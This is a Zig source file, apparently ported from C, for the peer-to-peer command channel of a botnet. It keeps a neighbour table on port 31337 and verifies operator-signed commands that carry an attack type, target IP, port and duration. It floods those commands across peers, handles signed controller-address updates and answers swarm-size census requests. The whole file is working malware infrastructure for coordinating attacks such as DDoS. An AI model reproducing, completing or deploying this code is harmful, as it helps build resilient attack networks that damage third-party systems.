//! # P2P Gossip Protocol
//!
//! UDP-based gossip with Ed25519 command verification.
//! Implements neighbor table, gossip flooding, and command dispatch.
//!
//! ## C Reference: modules/network/p2p/p2p.c (278 lines)

const std = @import("std");
const posix = std.posix;
const protocol = @import("../protocol.zig");
const crypto = @import("../crypto/mod.zig");

// ============================================================
// CONSTANTS (from C: p2p.h lines 13-15)
// ============================================================

pub const P2P_PORT: u16 = 31337;
pub const MAX_NEIGHBORS: usize = 15;
pub const GOSSIP_INTERVAL_MS: u64 = 60000;
pub const NONCE_BUFFER_SIZE: usize = 64;
pub const SIG_LEN: usize = 64;

// ============================================================
// NEIGHBOR TABLE (from C: p2p.h lines 17-22)
// ============================================================
// typedef struct {
//     uint32_t ip;        // Network Byte Order
//     uint16_t port;      // Network Byte Order
//     time_t last_seen;
//     bool is_active;
// } Neighbor;

pub const Neighbor = struct {
    ip: u32, // Network byte order
    port: u16, // Network byte order
    last_seen: i64, // Unix timestamp
    is_active: bool,

    pub fn init(ip: u32, port: u16) Neighbor {
        return .{
            .ip = ip,
            .port = port,
            .last_seen = std.time.timestamp(),
            .is_active = true,
        };
    }
};

// ============================================================
// P2P STATE
// ============================================================

pub const P2P = struct {
    sock: posix.socket_t,
    table: [MAX_NEIGHBORS]Neighbor,
    neighbor_count: usize,
    nonce_buffer: [NONCE_BUFFER_SIZE]u32,
    nonce_index: usize,

    // Cache for seen count requests (deduplication)
    seen_requests: [32]u32,
    seen_req_index: usize,

    // Callback for handling verified commands
    on_command: ?*const fn (attack_type: u8, ip: u32, port: u16, duration: u32) void,
    // Callback for broadcasting to edge subscribers
    on_broadcast: ?*const fn (payload: []const u8) void,

    // ============================================================
    // INIT (from C: p2p.c p2p_init lines 38-63)
    // ============================================================

    pub fn init() !P2P {
        const sock = try posix.socket(posix.AF.INET, posix.SOCK.DGRAM, 0);
        errdefer posix.close(sock);

        // SO_REUSEADDR
        const opt: i32 = 1;
        posix.setsockopt(sock, posix.SOL.SOCKET, posix.SO.REUSEADDR, std.mem.asBytes(&opt)) catch {};

        // Bind
        var addr: posix.sockaddr.in = .{
            .family = posix.AF.INET,
            .port = std.mem.nativeToBig(u16, P2P_PORT),
            .addr = 0, // INADDR_ANY
        };

        try posix.bind(sock, @ptrCast(&addr), @sizeOf(posix.sockaddr.in));

        // Non-blocking
        const flags = try posix.fcntl(sock, posix.F.GETFL, 0);
        _ = try posix.fcntl(sock, posix.F.SETFL, flags | @as(u32, @bitCast(posix.O{ .NONBLOCK = true })));

        var self = P2P{
            .sock = sock,
            .table = undefined,
            .neighbor_count = 0,
            .nonce_buffer = [_]u32{0} ** NONCE_BUFFER_SIZE,
            .nonce_index = 0,
            .seen_requests = [_]u32{0} ** 32,
            .seen_req_index = 0,
            .on_command = null,
            .on_broadcast = null,
        };

        // Zero table
        for (&self.table) |*n| {
            n.is_active = false;
        }

        return self;
    }

    pub fn deinit(self: *P2P) void {
        posix.close(self.sock);
    }

    // ============================================================
    // ADD NEIGHBOR (from C: p2p.c p2p_add_neighbor lines 65-95)
    // ============================================================

    pub fn addNeighbor(self: *P2P, ip: u32, port: u16) void {
        if (ip == 0 or port == 0) return;

        // 1. Check if exists
        for (&self.table) |*n| {
            if (n.is_active and n.ip == ip and n.port == port) {
                n.last_seen = std.time.timestamp();
                return;
            }
        }

        // 2. Find empty slot
        for (&self.table, 0..) |*n, i| {
            if (!n.is_active) {
                n.* = Neighbor.init(ip, port);
                if (i >= self.neighbor_count) {
                    self.neighbor_count = i + 1;
                }
                return;
            }
        }

        // 3. Table full - evict random
        var rng = crypto.FastRandom.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));
        const evict_idx = rng.next() % MAX_NEIGHBORS;
        self.table[evict_idx] = Neighbor.init(ip, port);
    }

    // ============================================================
    // NONCE REPLAY PROTECTION (from C: p2p.c lines 26-36)
    // ============================================================

    fn isNonceSeen(self: *P2P, nonce: u32) bool {
        for (self.nonce_buffer) |n| {
            if (n == nonce) return true;
        }
        return false;
    }

    fn addNonce(self: *P2P, nonce: u32) void {
        self.nonce_buffer[self.nonce_index] = nonce;
        self.nonce_index = (self.nonce_index + 1) % NONCE_BUFFER_SIZE;
    }

    // ============================================================
    // HANDLE PACKET (from C: p2p.c p2p_handle_packet lines 97-237)
    // ============================================================

    pub fn handlePacket(self: *P2P) void {
        var buffer: [1024]u8 = undefined;
        var src_addr: posix.sockaddr.in = undefined;
        var addr_len: posix.socklen_t = @sizeOf(posix.sockaddr.in);

        const len = posix.recvfrom(self.sock, &buffer, 0, @ptrCast(&src_addr), &addr_len) catch return;
        if (len < 5) return;

        // Check magic
        const header = @as(*const protocol.WireP2PHeader, @ptrCast(@alignCast(&buffer)));
        const magic = std.mem.bigToNative(u32, header.magic);

        // Accept current or previous time slot magic for tolerance
        const current_magic = crypto.magic.p2pMagic();
        const prev_magic = crypto.magic.p2pMagicPrev();

        if (magic == current_magic or magic == prev_magic) {
            if (header.type == protocol.WIRE_P2P_TYPE_GOSSIP) {
                self.handleGossip(buffer[0..len]);
            } else if (header.type == protocol.WIRE_P2P_TYPE_CMD) {
                self.handleCommand(buffer[0..len]);
            } else if (header.type == protocol.WIRE_P2P_TYPE_COUNT_REQ) {
                self.handleCountRequest(buffer[0..len], src_addr);
            }
        } else if (magic == protocol.WIRE_CONFIG_MAGIC) {
            self.handleConfigUpdate(buffer[0..len]);
        }
    }

    fn handleGossip(self: *P2P, data: []const u8) void {
        if (data.len < 6) return;

        const count = data[5];
        var offset: usize = 6;

        var i: u8 = 0;
        while (i < count) : (i += 1) {
            if (offset + 6 > data.len) break;

            const ip = std.mem.readInt(u32, data[offset..][0..4], .big);
            const port = std.mem.readInt(u16, data[offset + 4 ..][0..2], .big);
            self.addNeighbor(ip, port);
            offset += 6;
        }
    }

    fn handleCommand(self: *P2P, data: []const u8) void {
        // [Magic(4)] [Type(1)] [Nonce(4)] [Sig(64)] [Len(2)] [Payload...]
        if (data.len < 5 + 4 + 64 + 2) return;

        var offset: usize = 5;
        const nonce = std.mem.readInt(u32, data[offset..][0..4], .big);
        offset += 4;

        const sig = data[offset..][0..64];
        offset += 64;

        const payload_len = std.mem.readInt(u16, data[offset..][0..2], .big);
        offset += 2;

        if (offset + payload_len > data.len) return;
        const payload = data[offset .. offset + payload_len];

        // Replay protection
        if (self.isNonceSeen(nonce)) return;

        // Verify signature
        if (!crypto.ed25519.verify(payload, sig)) return;

        // Valid command
        self.addNonce(nonce);

        // Parse attack payload
        if (payload_len >= 11) {
            const atk = @as(*const protocol.AttackPayload, @ptrCast(@alignCast(payload.ptr)));

            if (self.on_command) |callback| {
                callback(atk.attack_type, atk.target_ip, atk.getTargetPort(), atk.getDuration());
            }

            if (self.on_broadcast) |broadcast| {
                broadcast(payload);
            }
        }

        // Propagate to random neighbors (gossip flood)
        self.propagate(data, 3);
    }

    // ============================================================
    // COUNT REQUEST HANDLER
    // ============================================================
    // CountRequest: [Magic(4)][Type=3(1)][ReqID(4)][TTL(1)][OriginIP(4)][OriginPort(2)]
    // CountResponse: [Magic(4)][Type=4(1)][ReqID(4)][NodeCount(4)]

    fn handleCountRequest(self: *P2P, data: []const u8, src_addr: posix.sockaddr.in) void {
        // Minimum size: magic(4) + type(1) + req_id(4) + ttl(1) + origin_ip(4) + origin_port(2) = 16
        if (data.len < 16) return;

        const req_id = std.mem.readInt(u32, data[5..9], .big);
        const ttl = data[9];
        const origin_ip = std.mem.readInt(u32, data[10..14], .big);
        const origin_port = std.mem.readInt(u16, data[14..16], .big);

        // Check if we've seen this request before
        for (self.seen_requests) |seen_id| {
            if (seen_id == req_id) return; // Already processed
        }

        // Add to seen cache (circular buffer)
        self.seen_requests[self.seen_req_index] = req_id;
        self.seen_req_index = (self.seen_req_index + 1) % 32;

        // Send response back to origin
        var resp_buf: [13]u8 = undefined;
        std.mem.writeInt(u32, resp_buf[0..4], std.mem.nativeToBig(u32, crypto.magic.p2pMagic()), .little);
        resp_buf[4] = protocol.WIRE_P2P_TYPE_COUNT_RESP;
        std.mem.writeInt(u32, resp_buf[5..9], std.mem.nativeToBig(u32, req_id), .little);
        std.mem.writeInt(u32, resp_buf[9..13], std.mem.nativeToBig(u32, @as(u32, @intCast(self.neighbor_count))), .little);

        var origin_addr: posix.sockaddr.in = .{
            .family = posix.AF.INET,
            .port = std.mem.nativeToBig(u16, origin_port),
            .addr = std.mem.nativeToBig(u32, origin_ip),
        };
        _ = posix.sendto(self.sock, &resp_buf, 0, @ptrCast(&origin_addr), @sizeOf(posix.sockaddr.in)) catch {};

        // Forward to neighbors if TTL > 0
        if (ttl > 0) {
            var fwd_buf: [16]u8 = undefined;
            @memcpy(fwd_buf[0..16], data[0..16]);
            fwd_buf[9] = ttl - 1; // Decrement TTL

            // Forward to neighbors (not back to sender)
            for (self.table) |n| {
                if (n.is_active) {
                    if (n.ip != src_addr.addr or n.port != src_addr.port) {
                        var dest: posix.sockaddr.in = .{
                            .family = posix.AF.INET,
                            .port = n.port,
                            .addr = n.ip,
                        };
                        _ = posix.sendto(self.sock, &fwd_buf, 0, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch {};
                    }
                }
            }
        }
    }

    fn handleConfigUpdate(self: *P2P, data: []const u8) void {
        if (data.len < @sizeOf(protocol.WireSignedConfigUpdate)) return;

        const pkg = @as(*const protocol.WireSignedConfigUpdate, @ptrCast(@alignCast(data.ptr)));

        // Version check would go here (need static var)
        const signed_data = pkg.getSignedData();

        if (!crypto.ed25519.verify(signed_data, &pkg.signature)) return;

        // Config update verified - extract new IP
        _ = pkg.getNewIpBytes();

        // Propagate more aggressively
        self.propagate(data, 5);
    }

    fn propagate(self: *P2P, data: []const u8, count: usize) void {
        var rng = crypto.FastRandom.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));

        var i: usize = 0;
        while (i < count) : (i += 1) {
            const idx = rng.next() % MAX_NEIGHBORS;
            if (self.table[idx].is_active) {
                var dest: posix.sockaddr.in = .{
                    .family = posix.AF.INET,
                    .port = self.table[idx].port,
                    .addr = self.table[idx].ip,
                };
                _ = posix.sendto(self.sock, data, 0, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch {};
            }
        }
    }

    // ============================================================
    // GOSSIP (from C: p2p.c p2p_gossip lines 240-277)
    // ============================================================

    pub fn gossip(self: *P2P) void {
        if (self.neighbor_count == 0) return;

        var buffer: [1024]u8 = undefined;

        // Header
        std.mem.writeInt(u32, buffer[0..4], std.mem.nativeToBig(u32, crypto.magic.p2pMagic()), .little);
        buffer[4] = protocol.WIRE_P2P_TYPE_GOSSIP;

        // Serialize neighbors
        var active_count: u8 = 0;
        var offset: usize = 6;

        for (self.table) |n| {
            if (n.is_active) {
                std.mem.writeInt(u32, buffer[offset..][0..4], n.ip, .big);
                std.mem.writeInt(u16, buffer[offset + 4 ..][0..2], n.port, .big);
                offset += 6;
                active_count += 1;
            }
        }
        buffer[5] = active_count;

        // Send to random neighbors (fan-out 3)
        var rng = crypto.FastRandom.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));

        var i: usize = 0;
        while (i < 3) : (i += 1) {
            const idx = rng.next() % MAX_NEIGHBORS;
            if (self.table[idx].is_active) {
                var dest: posix.sockaddr.in = .{
                    .family = posix.AF.INET,
                    .port = self.table[idx].port,
                    .addr = self.table[idx].ip,
                };
                _ = posix.sendto(self.sock, buffer[0..offset], 0, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch {};
            }
        }
    }
};
